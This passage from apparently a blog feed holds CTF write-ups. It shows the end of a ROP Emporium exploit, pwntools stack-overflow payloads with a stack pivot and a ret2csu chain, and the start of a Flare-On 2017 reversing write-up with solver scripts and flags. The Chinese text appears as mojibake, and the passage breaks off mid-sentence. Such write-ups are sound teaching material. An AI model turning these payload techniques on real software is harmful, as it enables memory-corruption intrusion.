class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">pay =  <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">40</span></span><br><span class="line">pay += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">pay += p32(leakaddr)</span><br><span class="line">pay += p32(leave_ret)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(pay)</span><br><span class="line">pause()</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#flag = io.recvline()</span></span><br><span class="line"><span class="comment">#print flag</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;ret2csu&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;ret2csu&#x27;</span>)</span><br><span class="line">csu_front_addr=<span class="number">0x400880</span></span><br><span class="line">csu_end_addr=<span class="number">0x40089a</span></span><br><span class="line">ret2win = <span class="number">0x4007b1</span></span><br><span class="line">init_pointer= <span class="number">0x0600E10</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,init_pointer,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xdeadcafebabebeef</span>,ret2win)</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ropemporium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flare on writeup 2017 writeup</title>
      <link href="2017-flare-on-write-up.html"/>
      <url>2017-flare-on-write-up.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>Flareonæ˜¯ä¸»è¦é¢˜ç›®ä¸ºé€†å‘çš„ä¸€åœºCTFæ¯”èµ›ï¼Œå·²ç»æ˜¯ç¬¬å››å±Šäº†ï¼Œæ¯”èµ›æ—¶é—´ä¸€ä¸ªæœˆå·¦å³ã€‚<br>è¿™æ˜¯ç¬¬ä¸€æ¬¡å‚åŠ è¿™ä¸ªæ¯”èµ›ï¼Œä»Šå¹´æ²¡æ‹¿åˆ°ç‰Œå­ï¼Œæ˜å¹´å†æˆ˜ï¼</p><div align=center>https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-flare-on-result.jpg</div><h2 id="ROT13"><a href="#ROT13" class="headerlink" title="ROT13"></a>ROT13</h2><h3 id="é¢˜é¢"><a href="#é¢˜é¢" class="headerlink" title="é¢˜é¢"></a>é¢˜é¢</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Html</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>FLARE On 2017<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Enter the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;prompt&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click to check the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span>);&#125;);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&quot;Correct flag!&quot;</span>);</span></span><br><span class="line"><span class="javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è§£rot13å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> rot13=<span class="string">&quot;tr &#x27;[A-Za-z]&#x27; &#x27;[N-ZA-Mn-za-m]&#x27;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> PyvragFvqrYbtvafNerRnfl@syner-ba.pbz | rot13</span><br></pre></td></tr></table></figure><p>flagï¼š <code>ClientSideLoginsAreEasy@flare-on.com</code></p><h2 id="Igniteme"><a href="#Igniteme" class="headerlink" title="Igniteme"></a>Igniteme</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ia; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> key; <span class="comment">// [esp+Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">  len = <span class="built_in">strlen</span>((<span class="keyword">int</span>)input_cpy);</span><br><span class="line">  key = getkey();</span><br><span class="line">  <span class="keyword">for</span> ( i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    cmpprep[i] = key ^ input_cpy[i];</span><br><span class="line">    key = input_cpy[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( ia = <span class="number">0</span>; ia &lt; <span class="number">0x27</span>; ++ia )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cmpprep[ia] != (<span class="keyword">unsigned</span> __int8)cmptable[ia] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºå¯åŠ¨åè¾“å…¥å­—ç¬¦ä¸²XORç„¶ååšå¯¹æ¯”ã€‚</p><h3 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vp = [<span class="number">0x0D</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x17</span>, <span class="number">0x78</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x6C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x45</span>, <span class="number">0x12</span>, <span class="number">0x2F</span>, <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x44</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x56</span>, <span class="number">0x09</span>, <span class="number">0x5F</span>, <span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x48</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x69</span>, <span class="number">0x04</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(vp)<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">  vp[i] = vp[i] ^ vp[i+<span class="number">1</span>]</span><br><span class="line">vp = <span class="string">&#x27;&#x27;</span>.join([ chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> vp[:<span class="number">-1</span>]])</span><br><span class="line"><span class="comment"># R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com</span></span><br></pre></td></tr></table></figure><h2 id="Greektome"><a href="#Greektome" class="headerlink" title="Greektome"></a>Greektome</h2><div align=center>![](https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-flare-on-greektome-01.jpg)</div><p>è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨å¥—æ¥å­—ä»å¦ä¸€å°æœºå™¨æ¥æ”¶æ•°æ®çš„ç¨‹åºã€‚çœ‹çœ‹ä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°IPåœ°å€=â€™127.0.0.1â€™å’Œç«¯å£= 0x8AE = 2222çš„ç¨‹åºæ˜¯å¼€æ”¾çš„ã€‚Buf æ¥æ”¶4ä¸ªå­—èŠ‚=&gt; lenï¼ˆdata_sendï¼‰&lt;= 4</p><p>æ”¶åˆ°æ•°æ®åï¼Œç¨‹åºä½¿ç”¨loc_40107c []æ•°ç»„ä¸­çš„å…ƒç´ å°†Buf [0]æ›¿æ¢ä¸ºxorï¼Œ å¹¶æ·»åŠ 22h  ï¼Œç„¶åå°†å…¶ä¿å­˜åˆ°æ•°ç»„ã€‚</p><div align=center>![](https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-flare-on-greektome-02.jpg)</div><p>å®è´¨ä¸Š<br>è¾“å…¥è¢«åˆ†æˆå¤šç»„ï¼Œæ¯ç»„20ä¸ªå­—ç¬¦ï¼Œå¯†é’¥éªŒè¯ç®—æ³•å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># # Key judgement</span><br><span class="line"># for &amp;bytes in 0x40107c -&gt; 0x40107c+0x79:</span><br><span class="line">#     bytes ^&#x3D; key</span><br><span class="line">#     bytes +&#x3D; 0x22</span><br><span class="line"># assert( 0xFB5E &#x3D;&#x3D; sub_4011E6(0x40107C, 0x79) )</span><br><span class="line"></span><br><span class="line"># # sub_4011E6(x,y)</span><br><span class="line"># assert( y !&#x3D; 0)</span><br><span class="line"># ebx &#x3D; x</span><br><span class="line"># eax &#x3D; 0x14</span><br><span class="line"># &#123;</span><br><span class="line">#     di &#x3D; (int16)var_4</span><br><span class="line">#     esi &#x3D; min(eax, edx)</span><br><span class="line">#     edx -&#x3D; esi</span><br><span class="line">#     &#123;</span><br><span class="line">#         eax &#x3D; </span><br><span class="line">#     &#125;</span><br><span class="line"># &#125;</span><br><span class="line"># &#x2F;&#x2F; CMOVx: Conditional move according to X</span><br><span class="line"># v2: 0x79 -&gt; 0x65 -&gt; 0x51 -&gt; 0x3D -&gt; 0x29 -&gt; 0x15 -&gt; 0x01 -&gt; 0</span><br></pre></td></tr></table></figure><h3 id="è§£é¢˜-2"><a href="#è§£é¢˜-2" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generator</span>(<span class="params">a1,a2</span>):</span></span><br><span class="line">    v2 = a2</span><br><span class="line">    v3 = <span class="number">0xff</span></span><br><span class="line">    v8 = <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> a2:</span><br><span class="line">        <span class="keyword">raise</span> ValueError</span><br><span class="line">    v4 = a1</span><br><span class="line">    scanned = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> v2:</span><br><span class="line">        v5 = v8</span><br><span class="line">        v6 = <span class="number">0x14</span> <span class="keyword">if</span> v2&gt;<span class="number">0x14</span> <span class="keyword">else</span> v2</span><br><span class="line">        v2 = v2 - v6</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(v6):</span><br><span class="line">            v5 = v5 + a1[scanned]</span><br><span class="line">            v5 = v5 &amp; <span class="number">0xFFFF</span></span><br><span class="line">            v3 = v3 + v5</span><br><span class="line">            v3 = v3 &amp; <span class="number">0xFFFF</span></span><br><span class="line">            scanned = scanned + <span class="number">1</span></span><br><span class="line">            <span class="comment">#print(&quot;% 3d - % 3d&quot;%(scanned, v6))</span></span><br><span class="line">        v8 = (v5 &gt;&gt; <span class="number">8</span>) + (<span class="number">0xff</span>&amp;v5)</span><br><span class="line">        v8 = v8 &amp; <span class="number">0xFFFF</span></span><br><span class="line">        v3 = (v3 &gt;&gt; <span class="number">8</span>) + (<span class="number">0xff</span>&amp;v3)</span><br><span class="line">        v3 = v3 &amp; <span class="number">0xFFFF</span></span><br><span class="line">        print(<span class="string">&quot;=== % 4x = % 4x ===&quot;</span>%(v8,v3))</span><br><span class="line">    <span class="keyword">return</span> ( (v8 &gt;&gt; <span class="number">8</span>) + ((<span class="number">0xFF</span>) &amp; v8) ) | ( <span class="number">0xFFFF</span> &amp; ( (v3 &lt;&lt; <span class="number">8</span>) + ((<span class="number">0xFF00</span>) &amp; v3) ) )</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">xk</span>):</span></span><br><span class="line">    borg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    33 E1 C4 99 </span></span><br><span class="line"><span class="string">    11 06 81 16 F0 32 9F C4  91 17 06 81 14 F0 06 81 </span></span><br><span class="line"><span class="string">    15 F1 C4 91 1A 06 81 1B  E2 06 81 18 F2 06 81 19 </span></span><br><span class="line"><span class="string">    F1 06 81 1E F0 C4 99 1F  C4 91 1C 06 81 1D E6 06 </span></span><br><span class="line"><span class="string">    81 62 EF 06 81 63 F2 06  81 60 E3 C4 99 61 06 81 </span></span><br><span class="line"><span class="string">    66 BC 06 81 67 E6 06 81  64 E8 06 81 65 9D 06 81 </span></span><br><span class="line"><span class="string">    6A F2 C4 99 6B 06 81 68  A9 06 81 69 EF 06 81 6E </span></span><br><span class="line"><span class="string">    EE 06 81 6F AE 06 81 6C  E3 06 81 6D EF 06 81 72 </span></span><br><span class="line"><span class="string">    E9 06 81 73 7C &quot;&quot;&quot;</span></span><br><span class="line">    bbs = [(<span class="number">0xff</span>&amp;((i^xk)+<span class="number">0x22</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> list(bytes.fromhex(borg.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)))]</span><br><span class="line">    <span class="keyword">return</span> generator(bbs, <span class="number">0x79</span>)</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xff</span>):</span><br><span class="line">    <span class="keyword">if</span> ( check(i) == <span class="number">0xFB5E</span> ):</span><br><span class="line">        j=i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># j = 0xa2</span></span><br><span class="line"><span class="comment"># Now it is time to check bytes</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x79</span>):</span><br><span class="line">    ida_bytes.patch_byte(<span class="number">0x40107c</span>+i, ida_bytes.get_byte(<span class="number">0x40107c</span>+i)^j)</span><br><span class="line"><span class="comment"># et_tu_brute_force@flare-on.com</span></span><br></pre></td></tr></table></figure><h2 id="Notepad"><a href="#Notepad" class="headerlink" title="Notepad"></a>Notepad</h2><p>è¿™ä¸ªé¢˜ç›®å°±ç•¥å‘äº†ã€‚ã€‚<br>æ­¤é¢˜wpå‚è€ƒ æœå¸ˆå‚… <a href="https://bbs.xdsec.club/d/116-flare-on-4-challange-problem-1-11-writeup">https://bbs.xdsec.club/d/116-flare-on-4-challange-problem-1-11-writeup</a></p><p>ä¸€é“ä¾§é‡äºæ ·æœ¬åˆ†æçš„ç¨‹åºã€‚æºç¨‹åºæ˜¯Windowsçš„è®°äº‹æœ¬ï¼Œè¢«åœ¨å¦ä¸€ä¸ªæ®µæ³¨å…¥äº†æ–°ä»£ç ï¼Œå¹¶ä¿®æ”¹äº†OEPã€‚æ–°ä»£ç ä¼šä½¿ç”¨ROR13è·å–æ‰€æœ‰åŠ è½½æ¨¡å—çš„å“ˆå¸Œï¼Œå¹¶æŒ‰ç…§å¦‚ä¸‹ç®—æ³•æ¯”è¾ƒå¹¶å­˜å‚¨ä¹‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="keyword">module</span> in PEB-&gt;LDRDATA-&gt;InMemoryOrderModuleList</span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">HashROR13</span><span class="params">(<span class="keyword">module</span>.name)</span></span>==HashROR13(TargetModuleName):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">module</span> # <span class="keyword">for</span> futher usage ;)</span><br></pre></td></tr></table></figure><p>æ³¨æ„çš„æ˜¯ï¼Œåœ¨æˆ‘çš„Windows 10ä¸­ï¼Œè¿™æ®µç¨‹åºä¼šå‡ºé—®é¢˜ï¼Œå› ä¸ºç”±äºä¸€äº›æœªçŸ¥çš„åŸå› ï¼Œè¿™æ®µä»£ç åœ¨æˆ‘æœºå™¨ä¸Šè·å–çš„æ¨¡å—åç§°ä¸ºå¤§å†™ï¼Œè€ŒROR13çš„å®ç°æ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚æˆ‘ä»¬åœ¨0x10153F6ä¸‹æ–­ç‚¹ï¼Œæ–­ç‚¹æ—¥å¿—ä¸ºParsing {s:edx}ï¼ŒæŸ¥çœ‹æ—¥å¿—ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Parsing L<span class="string">&quot;4_notepad.exe&quot;</span></span><br><span class="line">Parsing L<span class="string">&quot;ntdll.DLL&quot;</span></span><br><span class="line">Parsing L<span class="string">&quot;KERNEL32.DLL&quot;</span></span><br><span class="line">Parsing L<span class="string">&quot;KERNELBASE.dll&quot;</span></span><br><span class="line">Parsing L<span class="string">&quot;comdlg32.dll&quot;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°KERNEL32è¢«è·³è¿‡äº†ã€‚patchæ‰æ­¤å¤„ï¼Œä¾¿äºåŠ¨æ€è°ƒè¯•ã€‚</p><p>å¯¹äºè¢«è°ƒç”¨çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨Flare-IDAä¸­çš„Shellcode-hashesè„šæœ¬æ¥è¾…åŠ©åˆ†æã€‚é™æ€åˆ†æåå‘ç°ï¼Œç¨‹åºåœ¨éå†%USERPROFILE%/flareon2016challengeç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ£€æŸ¥å…¶æ—¶é—´æ˜¯å¦ç¬¦åˆç‰¹å¾å€¼ã€‚å¦‚æœç¬¦åˆï¼Œå°±æå–å‡ºå…¶ä¸­çš„å…«ä¸ªå­—èŠ‚åˆ°key.binä¸­ï¼Œä»¥æ­¤ç±»æ¨ã€‚Swingså¸ˆå‚…æé†’åï¼Œå‘ç°æ­£ç¡®çš„æ–‡ä»¶æ˜¯ä»å»å¹´çš„é¢˜ç›®åŒ…ä¸­ä¸‹è½½çš„ï¼ˆP.S æˆ‘è§‰å¾—è¿™ä¸ªé¢˜è®¾è®¡çš„ä¸€èˆ¬ï¼‰ã€‚é‡Šæ”¾æ–‡ä»¶åå†æ¬¡æ‰§è¡Œç¨‹åºï¼Œä¼šå¼¹å‡ºå¯¹è¯æ¡†ï¼š</p><p><a href="mailto:&#98;&#x6c;&#52;&#x35;&#55;&#x5f;&#102;&#x72;&#x30;&#109;&#x5f;&#116;&#x68;&#51;&#95;&#x70;&#x34;&#53;&#55;&#x40;&#102;&#108;&#x61;&#x72;&#101;&#x2d;&#x6f;&#x6e;&#x2e;&#99;&#x6f;&#x6d;">&#98;&#x6c;&#52;&#x35;&#55;&#x5f;&#102;&#x72;&#x30;&#109;&#x5f;&#116;&#x68;&#51;&#95;&#x70;&#x34;&#53;&#55;&#x40;&#102;&#108;&#x61;&#x72;&#101;&#x2d;&#x6f;&#x6e;&#x2e;&#99;&#x6f;&#x6d;</a></p><h2 id="Pewpewboat"><a href="#Pewpewboat" class="headerlink" title="Pewpewboat"></a>Pewpewboat</h2><p>è¿™æ˜¯ä¸€ä¸ªlinuxä¸‹çš„æ¸¸æˆ<br>å…³å¡æœ‰100å…³ï¼Œ<br>æˆ‘ä»¬åœ¨é™æ€åˆ†æä¸‹mainå‡½æ•°</p><div align=center>![](https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-flare-on-pewpewboat-01.jpg)</div><p>è¯¥å‡½æ•°genInitialSeed (0x403C85)ç”Ÿæˆç”¨äºâ€œè§£å¯†â€æ¸¸æˆæ•°æ®çš„åˆå§‹ç§å­ã€‚æˆ‘ä¼šè®©ä½ è¯»å®ƒï¼Œä½†å®ƒæœ¬è´¨ä¸ŠMD5æ˜¯â€loadingâ€¦ %d%%â€ä¸€ä¸ªå¾ªç¯ä¸­çš„å­—ç¬¦ä¸²ï¼Œ%dæ¯æ¬¡é€’å¢ã€‚<br>ç„¶åï¼Œæˆ‘ä»¬å°†çœ‹åˆ°99ä¸ªçº§åˆ«çš„å¾ªç¯ï¼Œæ¯æ¬¡è¿­ä»£ä»576ä¸ªå­—èŠ‚çš„è¡¨å¤åˆ¶æ¸¸æˆæ•°æ®ï¼Œç„¶åä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è§£å¯†å®ƒseed</p><p>æˆ‘ä»¬å¯ä»¥è¿›çœ‹ä¸€ä¸‹ä»–çš„å¾ªç¯</p><div align=center>![](https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-flare-on-pewpewboat-02.jpg)</div><p>ä»drawGrid (0x403263)åŠŸèƒ½ä¸Šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è¾“å…¥çš„åæ ‡å’Œâ€œèˆ¹â€çš„å®é™…ä½ç½®éƒ½å­˜å‚¨åœ¨gameStateã€‚è¯¥ä»£ç å°†æ ¹æ®ç”¨æˆ·è¾“å…¥çš„åæ ‡æ¥æ£€æŸ¥æ­£ç¡®çš„åæ ‡ï¼Œå¹¶ä¸”åªæœ‰åœ¨æœ‰åŒ¹é…çš„æƒ…å†µä¸‹æ‰ç»˜åˆ¶</p><div align=center>![](https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-flare-on-pewpewboat-03.jpg)</div><p>æˆ‘ä»¬ç»§ç»­process (0x04038D6)å¤„ç†ä»ç”¨æˆ·è¾“å…¥çš„åŠŸèƒ½ï¼Œæ£€æŸ¥å‘½ä¸­å¹¶æ 